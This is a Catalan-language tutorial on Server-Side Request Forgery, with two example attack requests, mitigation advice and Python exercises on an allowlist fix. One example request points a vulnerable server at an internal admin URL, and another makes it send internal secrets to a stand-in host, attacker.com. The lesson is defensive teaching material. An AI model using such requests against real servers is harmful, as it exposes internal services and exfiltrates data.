Introducció

Server-Side Request Forgery (SSRF) és una vulnerabilitat en la qual un atacant pot fer que el servidor realitzi sol·licituds HTTP a un domini arbitrari. Aquesta vulnerabilitat pot permetre als atacants accedir a recursos interns, exfiltrar dades sensibles i realitzar altres accions malicioses.

Conceptes Clau

  • Definició de SSRF: Vulnerabilitat que permet a un atacant manipular les sol·licituds que un servidor realitza a altres servidors.
  • Impacte: Pot portar a l'exposició de dades internes, execució de comandes remotes i altres activitats malicioses.
  • Vectors d'atac: URLs manipulades, paràmetres d'entrada no validats, serveis interns accessibles.

Exemples de SSRF

Exemple 1: Sol·licitud HTTP Manipulada

Un atacant pot manipular una sol·licitud HTTP perquè el servidor accedeixi a una URL interna:

GET /fetch?url=http://internal-service.local/admin
Host: vulnerable-website.com

En aquest cas, el servidor podria realitzar una sol·licitud a http://internal-service.local/admin, exposant informació sensible.

Exemple 2: Exfiltració de Dades

Un atacant pot utilitzar SSRF per exfiltrar dades sensibles:

GET /fetch?url=http://attacker.com?data=http://internal-service.local/secret
Host: vulnerable-website.com

El servidor podria enviar dades sensibles a http://attacker.com.

Mitigació de SSRF

  • Validació d'Entrades: Validar i sanititzar totes les entrades que s'utilitzen per construir URLs.
  • Llista Blanca de URLs: Implementar una llista blanca de URLs permeses per evitar que el servidor accedeixi a recursos no autoritzats.
  • Restriccions de Xarxa: Configurar regles de tallafocs per limitar l'accés del servidor a recursos interns i externs.
  • Autenticació i Autorització: Assegurar-se que les sol·licituds internes requereixin autenticació i autorització adequades.

Exercici Pràctic

Exercici 1: Identificació de SSRF

Donat el següent fragment de codi, identifiqui possibles vulnerabilitats de SSRF:

import requests

def fetch_data(url):
    response = requests.get(url)
    return response.content

data = fetch_data("http://example.com/data")
print(data)

Exercici 2: Mitigació de SSRF

Modifiqui el codi anterior per mitigar la vulnerabilitat de SSRF utilitzant una llista blanca de URLs permeses:

import requests

ALLOWED_URLS = ["http://example.com/data"]

def fetch_data(url):
    if url not in ALLOWED_URLS:
        raise ValueError("URL no permesa")
    response = requests.get(url)
    return response.content

data = fetch_data("http://example.com/data")
print(data)

Conclusió

SSRF és una vulnerabilitat crítica que pot tenir greus conseqüències si no es mitiga adequadament. És essencial que els desenvolupadors i professionals de TI comprenguin com identificar i prevenir SSRF mitjançant la validació d'entrades, l'ús de llistes blanques i la implementació de restriccions de xarxa. En seguir aquestes pràctiques, es pot reduir significativament el risc d'atacs SSRF i protegir els sistemes i dades sensibles.
